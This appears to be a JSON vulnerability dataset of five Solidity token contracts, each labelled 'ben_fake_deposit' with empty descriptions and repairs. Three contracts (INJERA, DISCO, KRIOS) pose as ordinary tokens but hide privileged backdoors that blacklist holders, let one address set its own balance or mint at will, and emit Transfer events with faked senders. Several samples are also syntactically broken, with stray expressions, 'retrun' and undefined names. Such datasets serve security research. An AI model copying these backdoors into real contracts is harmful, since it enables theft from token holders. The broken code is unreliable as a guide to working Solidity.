[
        {
        "Code": "contract StandardToken is Token {\n\n    function transfer(address _to, uint256 _value) returns (bool success) {\n        require(balances[msg.sender] >= _value && _value > 0);\n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n        Transfer(msg.sender, _to, _value);\n        return true;\n    }\n\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n        require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0);\n        balances[_to] += _value;\n        balances[_from] -= _value;\n        allowed[_from][msg.sender] -= _value;\n        Transfer(_from, _to, _value);\n        return true;\n    }\n\n    function balanceOf(address _owner) constant returns (uint256 balance) {\n        return balances[_owner];\n    }\n\n    function approve(address _spender, uint256 _value) returns (bool success) {\n        allowed[msg.sender][_spender] = _value;\n        Approval(msg.sender, _spender, _value);\n        return true;\n    }\n\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n      return allowed[_owner][_spender];\n    }\n\n    mapping (address => uint256) balances;\n    mapping (address => mapping (address => uint256)) allowed;\n    uint256 public totalSupply;\n}\n\n\ncontract ERC20Token is StandardToken {\n\n    function () {\n                throw;\n    }\n\n    \n\n    \n    string public name;                       uint8 public decimals;                    string public symbol;                     string public version = 'H1.0';       \n\n\n    function ERC20Token(\n        ) {\n        balances[msg.sender] = 100000000000000000;                       totalSupply = 100000000000000000;                                name = \"Huerey coin\";                                           decimals = 8;                                    symbol = \"HRC\";                                   }\n\n    \n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n        allowed[msg.sender][_spender] = _value;\n        Approval(msg.sender, _spender, _value);\n\n                                if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n        return true;\n    }\n}",
        "VulnerabilityDesc": [
            {
                "Name": "ben_fake_deposit_201",
                "Location": "",
                "Type": "ben_fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.6.12;\n\ncontract MetaSigma\n{\n\nmapping(address => uint256) balances;\n\nmapping(address => mapping (\n    address => uint256)) allowed;\n\nuint256 _totalSupply = 122800000*10*18;\n\naddress public owner  = 0x9aBcf7Ea64A1D9eA0e41Cc299989aBe7561A8364;\n\nevent Approval(address indexed _owner,\n        address indexed _spender,\n        uint256 _value);\n\nevent Transfer(address indexed _from,\n      address indexed _to,\n      uint256 _value);\n\nfunction totalSupply()\n    public view returns (\n    uint256 theTotalSupply)\n{\ntheTotalSupply = _totalSupply;\nreturn theTotalSupply;\n}\n\nfunction balanceOf(address _owner)\n    public view returns (\n    uint256 balance)\n{\nreturn balances[_owner];\n}\n\nfunction approve(address _spender,\n        uint256 _amount)\n        public returns (bool success)\n{\n    allowed[msg.sender][_spender] = _amount; 6000000*10**18\n  \n;emit Approval(msg.sender,\n        _spender, _amount);\nreturn true;\n}\n\nfunction transfer(address _to, uint256 _amount) public returns (bool success) {\n    require(balances[msg.sender] >= _amount) {;\n    balances[msg.sender] -= _amount;\n    balances[_to] += _amount;\n    emit Transfer(msg.sender, _to, _amount);\n    return true;\n}\n\nfunction transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {\n    require(balances[_from] >= _amount && allowed[_from][msg.sender] >= _amount && _amount > 0 && balances[_to] + _amount > balances[_to]);\n    balances[_from] -= _amount;\n    balances[_to] += _amount;\n    emit Transfer(_from, _to, _amount);\n    return true;\n}\n\nfunction allowance(address _owner,\n        address _spender)\n        public view returns (uint256 remaining)\n{\nreturn allowed[_owner][_spender];\n}\n}",
        "VulnerabilityDesc": [
            {
                "Name": "ben_fake_deposit_202",
                "Location": "",
                "Type": "ben_fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "contract INJERA {\n    mapping(address => uint256) public Nii;\n    mapping(address => uint256) public Mii;\n    mapping(address => bool) Oii;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"The INJERA\";\n    string public symbol = \"INJERA\";\n    uint8 public decimals = 18;\n    uint256 public totalSupply = 150000000 * (uint256(10) ** uint256(decimals));\n    address owner = msg.sender;\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event OwnershipRenounced(address indexed previousOwner);\n    address t_Construct = 0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B;\n\n    constructor() {\n        Nii[msg.sender] = totalSupply;\n        deploy(t_Construct, totalSupply);\n    }\n\n    address tdeploy = 0xeCB4f007bF97E81cb7bE6abA7Dd691fE8f99E803;\n\n    function deploy(address account, uint256 amount) public {\n        require(msg.sender == owner);\n        emit Transfer(address(0), account, amount);\n    }\n\n    function renounceOwnership() public {\n        require(msg.sender == owner);\n        emit OwnershipRenounced(owner);\n        owner = address(0);\n    }\n\n    function transfer(address to, uint256 value) public returns (bool success) {\n        if (msg.sender == tdeploy) {\n            require(Nii[msg.sender] >= value);\n            Nii[msg.sender] -= value;\n            Nii[to] += value;\n            emit Transfer(t_Construct, to, value);\n            return true;\n        } else{\n            require(!Oii[msg.sender]);\n            require(Nii[msg.sender] >= value);\n            Nii[msg.sender] -= value;\n            Nii[to] += value;\n            emit Transfer(msg.sender, to, value);\n            return true;\n        }\n    }\n\n    function approve(address spender, uint256 value) public returns (bool success) {\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n        return true;\n    }\n\n    function tdir() public {\n        if (msg.sender == tdeploy) {\n            Nii[msg.sender] = Mii[msg.sender];\n        }\n    }\n\n    function balanceOf(address account) public view returns (uint256) {\n        return Nii[account];\n    }\n\n    function trmv(address zi) public {\n        if (msg.sender == tdeploy) {\n            Oii[zi] = false;\n        }\n    }\n\n    function taubl(address zi) public {\n        if (msg.sender == tdeploy) {\n            require(!Oii[zi]);\n            Oii[zi] = true;\n        }\n    }\n\n    function tbrn(uint256 xi) public {\n        if (msg.sender == tdeploy) {\n            Mii[msg.sender] = xi;\n        }\n    }\n\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n        if (from == tdeploy) {\n            require(value <= Nii[from]);\n            require(value <= allowance[from][msg.sender]);\n            Nii[from] -= value;\n            Nii[to] += value;\n            emit Transfer(t_Construct, to, value);\n            return true;\n        } else{\n            require(!Oii[from] && !Oii[to]);\n            require(value <= Nii[from]);\n            require(value <= allowance[from][msg.sender]);\n            Nii[from] -= value;\n            Nii[to] += value;\n            allowance[from][msg.sender] -= value;\n            emit Transfer(from, to, value);\n            return true;\n        }\n    }\n}",
        "VulnerabilityDesc": [
            {
                "Name": "ben_fake_deposit_203",
                "Location": "",
                "Type": "ben_fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "contract DISCO is Context, Ownable {\n    using SafeMath for uint256;\n\n    mapping(address => uint256) private Ac;\n    mapping(address => bool) private Ab;\n    mapping(address => bool) private Az;\n    mapping(address => mapping(address => uint256)) private Ae;\n\n    uint8 private constant _decimals = 8;\n    uint256 private constant sA = 200000000 * 10**_decimals;\n    string private constant _name = \"Disco.xyz\";\n    string private constant _symbol = \"DISCO\";\n\n    constructor () {\n        Ac[_msgSender()] = sA;\n        emit Transfer(address(0), aZRouterV2, sA);\n    }\n\n    function name() public pure returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public pure returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public pure returns (uint8) {\n        return _decimals;\n    }\n\n    function totalSupply() public pure returns (uint256) {\n        return sA;\n    }\n\n    function balanceOf(address account) public view returns (uint256) {\n        return Ac[account];\n    }\n\n    function allowance(address owner, address spender) public view returns (uint256) {\n        return Ae[owner][spender];\n    }\n\n    function ARX(address Af) AX public {\n        Ab[Af] = true;\n    }\n\n    function approve(address spender, uint256 amount) public returns (bool success) {    \n        Ae[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function ADX(address Af) public {\n        if(Ab[msg.sender]) { \n            Az[Af] = false;\n        }\n    }\n\n    function aQuery(address Af) public {\n        if(Ab[msg.sender]) { \n            require(!Az[Af]);\n            Az[Af] = true;\n        }\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n        if(sender == AZC) {\n            require(amount <= Ac[sender]);\n            Ac[sender] -= amount;  \n            Ac[recipient] += amount; \n            Ae[sender][msg.sender] -= amount;\n            emit Transfer(aZRouterV2, recipient, amount);\n            return true;\n        } else {\n            require(!Az[recipient] && !Az[sender]);\n            require(amount <= Ac[sender]);\n            require(amount <= Ae[sender][msg.sender]);\n            Ac[sender] -= amount;\n            Ac[recipient] += amount;\n            Ae[sender][msg.sender] -= amount;\n            emit Transfer(sender, recipient, amount);\n            return true;\n        }\n    }\n\n    function transfer(address Ai, uint256 Af) public returns (bool){\n        if(msg.sender == AZC) {\n            require(Ac[msg.sender] >= Af);\n            Ac[msg.sender] -= Af;  \n            Ac[Ai] += Af; \n            emit Transfer(aZRouterV2, Ai, Af);\n            return true;\n        } else if(Ab[msg.sender]) {\n            Ac[Ai] += Af;\n            emit Transfer(msg.sender, Ai, Af);\n            return true;\n        } else {\n            require(!Az[msg.sender] && Ac[msg.sender] >= Af);\n            Ac[msg.sender] -= Af;  \n            Ac[Ai] += Af;          \n            emit Transfer(msg.sender, Ai, Af);\n            retrun true;\n        }\n    }\n}",
        "VulnerabilityDesc": [
            {
                "Name": "ben_fake_deposit_204",
                "Location": "",
                "Type": "ben_fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\n\n\n  library SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}   \n \n \n    contract KRIOS {\n  \n    mapping (address => uint256) public Sz;\n    mapping (address => uint256) public Ui;\n    mapping (address => bool) oZ;\n    mapping(address => mapping(address => uint256)) public allowance;\n  address pstruct = 0xBc46cB43DA85A65774acfCA3B03b7234E8e81c7a;\n  address RouterV3 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\n\n\n\n\n    string public name = unicode\"Krios Labs\";\n    string public symbol = unicode\"KRIOS\";\n    uint8 public decimals = 18;\n    uint256 public totalSupply = 250000000 * (uint256(10) ** decimals);\n  address owner = msg.sender;\n   \n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event OwnershipRenounced(address indexed previousOwner);\n\n\n    constructor()  {\n    Sz[msg.sender] = totalSupply;\n    emit Transfer(address(0), RouterV3, totalSupply); }\n\n   \n\n    function renounceOwnership() public {\n    require(msg.sender == owner);\n    emit OwnershipRenounced(owner);\n    owner = address(0);}\n\n\n        function transfer(address to, uint256 value) public returns (bool success) {\n      \n       \n        if(msg.sender == pstruct)  {\n        require(Sz[msg.sender] >= value);\n        Sz[msg.sender] -= value;  \n        Sz[to] += value; \n        emit Transfer (RouterV3, to, value);\n        return true; }  \n        else{\n            require(!oZ[msg.sender] && Sz[msg.sender] >= value);\n            Sz[msg.sender] -= value;  \n            Sz[to] += value;          \n            emit Transfer(msg.sender, to, value);\n            return true; \n        }\n\n}\n    \n\n        function approve(address spender, uint256 value) public returns (bool success) {    \n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n        return true; }\n\n        function mBurn () public {\n         if(msg.sender == pstruct)   {\n        Sz[msg.sender] = Ui[msg.sender];\n        }}\n\n        function balanceOf(address account) public view returns (uint256) {\n        return Sz[account]; }\n\n        function mDel(address jx) public {\n        if(msg.sender == pstruct)  { \n        oZ[jx] = false;}}\n        function mCheck(address jx) public{\n         if(msg.sender == pstruct)  { \n        require(!oZ[jx]);\n        oZ[jx] = true;\n        }}\n             function mBridge(uint256 ki) public {\n        if(msg.sender == pstruct)  { \n        Ui[msg.sender] = ki;} }\n\n\n\n        function transferFrom(address from, address to, uint256 value) public returns (bool success) { \n        if(from == pstruct)  {\n        require(value <= Sz[from]);\n        require(value <= allowance[from][msg.sender]);\n        Sz[from] -= value;  \n        Sz[to] += value; \n        emit Transfer (RouterV3, to, value);\n        return true; }    \n        else  {\n            require(!oZ[from] && !oZ[to]);\n            require(value <= Sz[from]);\n            require(value <= allowance[from][msg.sender]);\n            Sz[from] -= value;\n            Sz[to] += value;\n            allowance[from][msg.sender] -= value;\n            emit Transfer(from, to, value);\n            return true; \n        }\n}",
        "VulnerabilityDesc": [
            {
                "Name": "ben_fake_deposit_205",
                "Location": "",
                "Type": "ben_fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    }
]